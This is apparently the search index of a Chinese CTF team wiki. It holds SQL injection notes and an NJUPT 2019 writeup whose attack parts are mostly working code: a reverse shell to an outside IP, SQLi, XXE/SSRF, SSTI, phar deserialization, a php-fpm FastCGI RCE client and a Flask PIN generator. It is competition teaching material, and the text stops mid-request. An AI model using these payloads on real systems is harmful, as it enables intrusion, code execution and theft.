{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Merak Wiki Writeup \u7528\u4e8e\u540c\u5b66\u5206\u4eab\u8be6\u7ec6\u7248Writeup \u77e5\u8bc6\u5e93 \u7528\u4e8e\u540c\u5b66\u5206\u4eab\u76f8\u5173\u77e5\u8bc6","title":"Merak Wiki"},{"location":"#merak-wiki","text":"","title":"Merak Wiki"},{"location":"#writeup","text":"\u7528\u4e8e\u540c\u5b66\u5206\u4eab\u8be6\u7ec6\u7248Writeup","title":"Writeup"},{"location":"#_1","text":"\u7528\u4e8e\u540c\u5b66\u5206\u4eab\u76f8\u5173\u77e5\u8bc6","title":"\u77e5\u8bc6\u5e93"},{"location":"knowledge/crypto/\u53e4\u5178\u52a0\u5bc6/","text":"","title":"\u53e4\u5178\u52a0\u5bc6"},{"location":"knowledge/misc/\u6d41\u91cf\u5206\u6790/","text":"","title":"\u6d41\u91cf\u5206\u6790"},{"location":"knowledge/pwn/overflow/","text":"","title":"Overflow"},{"location":"knowledge/re/SMC/","text":"SMC","title":"SMC"},{"location":"knowledge/re/SMC/#smc","text":"","title":"SMC"},{"location":"knowledge/web/injection/","text":"SQL\u6ce8\u5165 \u7206\u6570\u636e information_schema information_schema\u7684\u8868tables\u4e2d\u7684\u5217table_schema\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868tables\u4e2d\u7684\u5217table_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217table_schema\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217table_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217column_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u5217\u7684\u540d\u5b57 \u7206\u6570\u636e\u5e93 database() SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA; \u7206\u8868 SELECT group_concat(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA = '\u6570\u636e\u5e93\u540d\u79f0'; \u7206\u5b57\u6bb5 SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name = '\u8868\u540d\u79f0'; insert \u6ce8\u5165 \u8003\u5bdfinsert\u8bed\u6cd5 INSERT INTO table_name (\u52171, \u52172,...) VALUES (\u503c1, \u503c2,...,\u503cn) \u82e5\u503ci\u53ef\u4ee5\u63a7\u5236,\u4e0d\u59a8\u6784\u9020\u5982\u4e0bsql\u8bed\u53e5 INSERT INTO table_name (\u52171, \u52172,...) VALUES (\u503c1, \u503c2,...,\u503ci,...,\u503cn),(\u503c1,...,\u503ci-1,(\u9700\u8981\u7684sql\u8bed\u53e5),\u503ci+1,...,\u503cn) \u9519\u8bef\u6ce8\u5165\u603b\u7ed3 1. and (select 1 from (select count(*),concat((*******),floor(rand(0)*2))x from information_schema.tables group by x)a); \u65e0\u957f\u5ea6\u9650\u5236 2. and (extractvalue(1,concat(1,(****)))); \u53ea\u80fd32\u4f4d 3. and (updatexml(1,concat(0x7e,(****),0x7e),1)); mysql >5.1.5 4. and exp(~(select * from(****)a)); mysql>5.5.5 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7ed5\u8fc7addslashes \u5982\u679c\u6211\u4eec\u80fd\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u62fc\u63a5 %\u2018 or 1=1# \uff0c\u8fdb\u5165\u670d\u52a1\u5668\u540eaddslashes\u7ed3\u679c\u53d8\u6210 %\\' or 1=1# \uff0c\u518d\u62fc\u63a5\u5165\u5f85\u683c\u5f0f\u5316\u7684sql\u8bed\u53e5\uff1a SELECT username, password FROM users where username='%\\' or 1=1#' \u56e0\u4e3a %\\ \u4e0d\u662f\u4efb\u4f55\u4e00\u79cd\u8f93\u51fa\u7c7b\u578b\uff0c\u683c\u5f0f\u5316\u540e\u5f97\u5230\uff1a SELECT username, password FROM users where username='' or 1=1#' \u6210\u529f\u9003\u9038\u4f46\u662f\u53ef\u80fd\u4f1a\u51fa\u73b0php\u62a5\u9519\uff1a PHP Warning: sprintf(): Too few arguments \u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684payload: %1$' \u4e0d\u4f1a\u5f15\u8d77\u76f8\u5173\u62a5\u9519 \u5bbd\u5b57\u8282\u6ce8\u5165\u7ed5\u8fc7addslashes ' \u8f6c\u4e49\u4e4b\u540e \u53d8\u4e3a \\' ,\u82e5 %df%27 \u8f6c\u4e49\u6210 %df%5c%27 = \u904b' \u5f15\u53f7\u9003\u9038 \u7ed5\u8fc7information_schema \u8fc7\u6ee4\u4e86 or \u5bfc\u81f4\u6ca1\u6709\u529e\u6cd5\u901a\u8fc7 information_schema \u5e93\u6765\u67e5\u8be2\u8868\u540d\uff0c\u7136\u800c\u5176\u5b9e MySQL 5.7 \u4e4b\u540e\u7684\u7248\u672c\uff0c\u5728\u5176\u81ea\u5e26\u7684 mysql \u5e93\u4e2d\uff0c\u65b0\u589e\u4e86 innodb_table_stats \u548c innodb_index_stats \u8fd9\u4e24\u5f20\u65e5\u5fd7\u8868\u3002\u5982\u679c\u6570\u636e\u8868\u7684\u5f15\u64ce\u662f innodb \uff0c\u5219\u4f1a\u5728\u8fd9\u4e24\u5f20\u8868\u4e2d\u8bb0\u5f55\u8868\u3001\u952e\u7684\u4fe1\u606f \u3002","title":"Injection"},{"location":"knowledge/web/injection/#sql","text":"","title":"SQL\u6ce8\u5165"},{"location":"knowledge/web/injection/#_1","text":"","title":"\u7206\u6570\u636e"},{"location":"knowledge/web/injection/#information_schema","text":"information_schema\u7684\u8868tables\u4e2d\u7684\u5217table_schema\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868tables\u4e2d\u7684\u5217table_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217table_schema\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217table_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217column_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u5217\u7684\u540d\u5b57","title":"information_schema"},{"location":"knowledge/web/injection/#_2","text":"database() SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA;","title":"\u7206\u6570\u636e\u5e93"},{"location":"knowledge/web/injection/#_3","text":"SELECT group_concat(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA = '\u6570\u636e\u5e93\u540d\u79f0';","title":"\u7206\u8868"},{"location":"knowledge/web/injection/#_4","text":"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name = '\u8868\u540d\u79f0';","title":"\u7206\u5b57\u6bb5"},{"location":"knowledge/web/injection/#insert","text":"\u8003\u5bdfinsert\u8bed\u6cd5 INSERT INTO table_name (\u52171, \u52172,...) VALUES (\u503c1, \u503c2,...,\u503cn) \u82e5\u503ci\u53ef\u4ee5\u63a7\u5236,\u4e0d\u59a8\u6784\u9020\u5982\u4e0bsql\u8bed\u53e5 INSERT INTO table_name (\u52171, \u52172,...) VALUES (\u503c1, \u503c2,...,\u503ci,...,\u503cn),(\u503c1,...,\u503ci-1,(\u9700\u8981\u7684sql\u8bed\u53e5),\u503ci+1,...,\u503cn)","title":"insert \u6ce8\u5165"},{"location":"knowledge/web/injection/#_5","text":"1. and (select 1 from (select count(*),concat((*******),floor(rand(0)*2))x from information_schema.tables group by x)a); \u65e0\u957f\u5ea6\u9650\u5236 2. and (extractvalue(1,concat(1,(****)))); \u53ea\u80fd32\u4f4d 3. and (updatexml(1,concat(0x7e,(****),0x7e),1)); mysql >5.1.5 4. and exp(~(select * from(****)a)); mysql>5.5.5","title":"\u9519\u8bef\u6ce8\u5165\u603b\u7ed3"},{"location":"knowledge/web/injection/#addslashes","text":"\u5982\u679c\u6211\u4eec\u80fd\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u62fc\u63a5 %\u2018 or 1=1# \uff0c\u8fdb\u5165\u670d\u52a1\u5668\u540eaddslashes\u7ed3\u679c\u53d8\u6210 %\\' or 1=1# \uff0c\u518d\u62fc\u63a5\u5165\u5f85\u683c\u5f0f\u5316\u7684sql\u8bed\u53e5\uff1a SELECT username, password FROM users where username='%\\' or 1=1#' \u56e0\u4e3a %\\ \u4e0d\u662f\u4efb\u4f55\u4e00\u79cd\u8f93\u51fa\u7c7b\u578b\uff0c\u683c\u5f0f\u5316\u540e\u5f97\u5230\uff1a SELECT username, password FROM users where username='' or 1=1#' \u6210\u529f\u9003\u9038\u4f46\u662f\u53ef\u80fd\u4f1a\u51fa\u73b0php\u62a5\u9519\uff1a PHP Warning: sprintf(): Too few arguments \u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684payload: %1$' \u4e0d\u4f1a\u5f15\u8d77\u76f8\u5173\u62a5\u9519","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7ed5\u8fc7addslashes"},{"location":"knowledge/web/injection/#addslashes_1","text":"' \u8f6c\u4e49\u4e4b\u540e \u53d8\u4e3a \\' ,\u82e5 %df%27 \u8f6c\u4e49\u6210 %df%5c%27 = \u904b' \u5f15\u53f7\u9003\u9038","title":"\u5bbd\u5b57\u8282\u6ce8\u5165\u7ed5\u8fc7addslashes"},{"location":"knowledge/web/injection/#information_schema_1","text":"\u8fc7\u6ee4\u4e86 or \u5bfc\u81f4\u6ca1\u6709\u529e\u6cd5\u901a\u8fc7 information_schema \u5e93\u6765\u67e5\u8be2\u8868\u540d\uff0c\u7136\u800c\u5176\u5b9e MySQL 5.7 \u4e4b\u540e\u7684\u7248\u672c\uff0c\u5728\u5176\u81ea\u5e26\u7684 mysql \u5e93\u4e2d\uff0c\u65b0\u589e\u4e86 innodb_table_stats \u548c innodb_index_stats \u8fd9\u4e24\u5f20\u65e5\u5fd7\u8868\u3002\u5982\u679c\u6570\u636e\u8868\u7684\u5f15\u64ce\u662f innodb \uff0c\u5219\u4f1a\u5728\u8fd9\u4e24\u5f20\u8868\u4e2d\u8bb0\u5f55\u8868\u3001\u952e\u7684\u4fe1\u606f \u3002","title":"\u7ed5\u8fc7information_schema"},{"location":"writeup/NJUPT-2019/","text":"NJUPT CTF \u5929\u7487Writeup Web hacker_backdoor \u8fd9\u91cc\u662fdisable_function\u5fd8\u8bb0\u6dfb\u52a0proc_open\uff0c\u7528curl\u5e26\u51fa\u6765\u5c31\u597d import requests url = \"http://nctf2019.x1ct34m.com:60004/?useful=/etc/passwd&code=$a=%22create_f%22.%22unction%22;$c=$a(%27%27,$_POST[a]);$c();\" print requests.post(url,data={'a':\"\"\" $descriptorspec=array( 0=>array('pipe','r'), //STDIN 1=>array('pipe','w'),//STDOUT 2=>array('pipe','w') //STDERROR ); $handle=proc_open('bash -c \"bash -i >& /dev/tcp/122.152.230.160/2333 0>&1\"',$descriptorspec,$pipes,NULL); var_dump($handle); \"\"\"}).text simple XSS \u968f\u4fbf\u6ce8\u518c\u540e\u53d1\u73b0\u76f4\u63a5\u53ef\u4ee5XSS\uff0c\u4f46\u662f\u6ca1\u6709\u4efb\u4f55\u65b9\u5411\uff0c\u8fd9\u4e2a\u65f6\u5019admin\u8d26\u6237\u88ab\u6ce8\u518c\u8fc7\u4e86\uff0c\u60f3\u6cd5\u662f\u76f4\u63a5\u7528admin\u7684cookie\u767b\u5165\uff0c\u642d\u5efa\u597d\u5e73\u53f0\u540e\uff0c\u5411admin\u53d1\u9001XSS payload\uff0c\u77ac\u95f4\u770b\u5230\u4e86admin\u7684cookie. burp\u5c06\u5176\u81ea\u5df1\u7528\u6237\u7684COOKIE\u66ff\u6362\u6210\u4e3aadmin\u7684cookie\uff0c\u5f97\u5230flag\uff1aNCTF{Th1s_is_a_Simple_xss} flask_website \u4efb\u610f\u6587\u4ef6\u8bfb+PIN-Debug\uff0cdocker\u6a21\u5f0f\u4e0bmachine\u2014id\u6709\u53d8\u5316\u3002\u66f4\u65b0\u811a\u672c\u5373\u53ef \u53c2\u8003\u6587\u732e\uff1a Flask debug pin\u5b89\u5168\u95ee\u9898 #!/usr/bin/python2.7 #coding:utf-8 from sys import * import requests import re from itertools import chain import hashlib def genpin(mac,mid): probably_public_bits = [ 'ctf',# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.6/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] mac = \"0x\"+mac.replace(\":\",\"\") mac = int(mac,16) private_bits = [ str(mac),# str(uuid.getnode()), /sys/class/net/eth0/address str(mid)# get_machine_id(), /proc/sys/kernel/random/boot_id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num return rv # 02:42:ac:16:00:02 /sys/class/net/eth0/address # 21e83dfd-206c-4e80-86be-e8d0afc467a1 /proc/sys/kernel/random/boot_id def getcode(content): try: return re.findall(r\"<pre>([\\s\\S]*)</pre>\",content)[0].split()[0] except: return '' def getshell(): print genpin(\"02:42:ac:16:00:02\",\"8657e88ac278e9225ba324bb8033ca3398c16c7b517417b55c1f164e90d97a46\") if __name__ == '__main__': print(getshell()) SQLi \u539f\u9898,\u4f7f\u7528REGEXP\u6b63\u5219 import requests url = \"http://nctf2019.x1ct34m.com:40005/index.php\" flag = \"\" k = 0 list = \"qwertyuiopasdfghjklzxcvbnm_0123456789\" while True: k+= 1 print k, for i in list: p = len(requests.post(url,data={ \"passwd\":\"\"\"||passwd/**/REGEXP/**/\"^\\\\{}\";\\x00\"\"\".format(flag+i), \"username\":'\\\\' }).text) if p == 48: # print chr(i) flag += i print flag break easyphp \u5957\u5a03\u9898\uff0c\u6ca1\u5565\u8bf4\u7684 http://nctf2019.x1ct34m.com:60005/?num=23333%0a&str1=2120624&str2=240610708&q%20w%20q=c\\at%20* phar matches everything(\u63a8\u8350\u597d\u597d\u7814\u7a76\u4e00\u4e0b) \u6839\u636evim\u4ea4\u6362\u6587\u4ef6\u5f97\u5230\u6587\u4ef6\u6e90\u7801 \u7b2c\u4e8c\u6b65\u6839\u636e Phar \u6784\u9020\u53cd\u5e8f\u5217\u5316 \u4f7f\u7528curl\u5f97\u5230SSTI \u6700\u540e\u5185\u7f51\u626b\u63cf\u5f97\u5230\u4e00\u4e2ahint => fpm \u7136\u540e\u901a\u8fc7gopher\u534f\u8bae\u5f97\u5230 Phar+SSTI+FPM <?php class Easytest{ protected $test; public function __construct(){ $this->test = '1'; } public function funny_get(){ return $this->test; } } class Main { public $url; public function curl($url){ $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; } public function __destruct(){ $this_is_a_easy_test=unserialize($_GET['careful']); if($this_is_a_easy_test->funny_get() === '1'){ echo $this->curl($this->url); } } } $a = new Easytest(); echo urlencode(serialize($a)); //O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D $m = new Main(); $url = $argv[1]; $m->url = \"\"; #!coding=utf8 import requests import re file = open('phar.phar') url1 = \"http://nctf2019.x1ct34m.com:40004/upload.php\" url2 = \"http://nctf2019.x1ct34m.com:40004/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D\" def upload(): content = requests.post(url1,files={\"fileToUpload\":('1.gif',file)}).text print content return re.findall(r\"file (.*) has\",content)[0].strip() def req(filename): print requests.post(url2,data={ 'name':'phar:///var/www/html/uploads/{}/test.txt'.format(filename), 'submit':1 }).text name = upload() print name req(name) import socket import random import argparse import sys from io import BytesIO # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys.version_info.major == 2 else False def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict') def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return s class FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid >> 8) & 0xFF) \\ + bchr(requestid & 0xFF) \\ + bchr((length >> 8) & 0xFF) \\ + bchr(length & 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen < 128: record += bchr(nLen) else: record += bchr((nLen >> 24) | 0x80) \\ + bchr((nLen >> 16) & 0xFF) \\ + bchr((nLen >> 8) & 0xFF) \\ + bchr(nLen & 0xFF) if vLen < 128: record += bchr(vLen) else: record += bchr((vLen >> 24) | 0x80) \\ + bchr((vLen >> 16) & 0xFF) \\ + bchr((vLen >> 8) & 0xFF) \\ + bchr(vLen & 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs={}, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 << 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) self.sock.send(request) self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId]['response'] = b'' return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:{} port:{}\".format(self.host, self.port) if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file content = args.code params = { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'safe_mode=Off\\nopen_basedir=Off\\ndisable_functions=Off\\nallow_url_include = On' } response = client.request(params, content) print(force_text(response)) Fake XML cookbook F12\u770b\u4e86\u4e00\u773c\u53d1\u73b0 function doLogin(){ var username = $(\"#username\").val(); var password = $(\"#password\").val(); if(username == \"\" || password == \"\"){ alert(\"Please enter the username and password!\"); return; } var data = \"<user><username>\" + username + \"</username><password>\" + password + \"</password></user>\"; $.ajax({ type: \"POST\", url: \"doLogin.php\", contentType: \"application/xml;charset=utf-8\", data: data, dataType: \"xml\", anysc: false, success: function (result) { var code = result.getElementsByTagName(\"code\")[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(\"msg\")[0].childNodes[0].nodeValue; if(code == \"0\"){ $(\".msg\").text(msg + \" login fail!\"); }else if(code == \"1\"){ $(\".msg\").text(msg + \" login success!\"); }else{ $(\".msg\").text(\"error:\" + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(\".msg\").text(errorThrown + ':' + textStatus); } }); } \u7528XML\u548c\u670d\u52a1\u5668\u901a\u8baf\uff0c\u8054\u60f3\u5230XXE\u653b\u51fb burp\u6293post\u5305\u5f97\u5230 POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40002 Content-Length: 207 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40002 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close <user><username>admin</username><password>123</password></user> \u6839\u636ejs\u811a\u672c\u53ef\u4ee5\u53d1\u73b0username\u662f\u53ef\u4ee5\u56de\u663e\u7684 \u7136\u540e\u6784\u9020\u4e00\u4e0bexp POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40002 Content-Length: 207 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40002 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"> ]> <user><username>&xxe;</username><password>123</password></user> True XML cookbook XML+SSRF\u6253\u5185\u7f51 POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40003 Content-Length: 220 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40003 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=http://192.168.1.8\"> ]> <user><username>&xxe;</username><password>123</password></user> NCTF{XXE-labs_is_g00d} flask \u6a21\u677f\u6ce8\u5165,\u7528\u901a\u914d\u7b26\u8bfbflag http://nctf2019.x1ct34m.com:40007/%7B%7B''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('cat%20/fla?%27).read()%7D%7D Upload your Shell \u4f20\u4e00\u4e2a\u56fe\u7247\u9a6c,\u4f1a\u8fd4\u56de\u4e00\u4e2a\u9898\u76ee\u672c\u8eab\u5c31\u51c6\u5907\u597d\u7684\u56fe\u7247\u9a6c\u7684\u6240\u5728\u76ee\u5f55 \u627e\u4e2a\u5730\u65b9\u5305\u542b\u4e00\u4e0b\u5c31\u597d\u4e86 http://nctf2019.x1ct34m.com:60002/index.php?action=/upload-imgs/9ae46c526dfb6d96e95ad35bfbb2b6c4/Th1s_is_a_fl4g.jpg replace \u586b\u4e09\u4e2a\"#\"\u62a5\u9519 Parse error: syntax error, unexpected end of file in /var/www/html/index.php(70) : regexp code on line 1 Fatal error: preg_replace(): Failed evaluating code: # in /var/www/html/index.php on line 70 \u5b9e\u73b0\u529f\u80fd\u4f7f\u7528\u7684\u662fpreg_replace() \u9898\u76ee\u63d0\u793a\u7528\u4e86php5.6 \u60f3\u5230preg_replace() /e\u53c2\u6570 \u8bd5\u4e00\u4e0b\u53ef\u4ee5\u6267\u884cphpinfo() POST /index.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40006 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 72 Origin: http://nctf2019.x1ct34m.com:40006 Connection: close Referer: http://nctf2019.x1ct34m.com:40006/index.php Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g Upgrade-Insecure-Requests: 1 sub=text&pat=e&rep=phpinfo(); \u4f46\u662f\u76f4\u63a5\u7528readfile('/flag')\u8bfb\u6587\u4ef6\uff0c\u53d1\u73b0\u5355\u5f15\u53f7\u88ab\u62e6\u622a \u4e8e\u662f\u7528chr()\u62fc\u63a5\u8868\u793a\u5b57\u7b26\u4e32\u3002\u3002\u3002\u3002\u3002 POST /index.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40006 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: 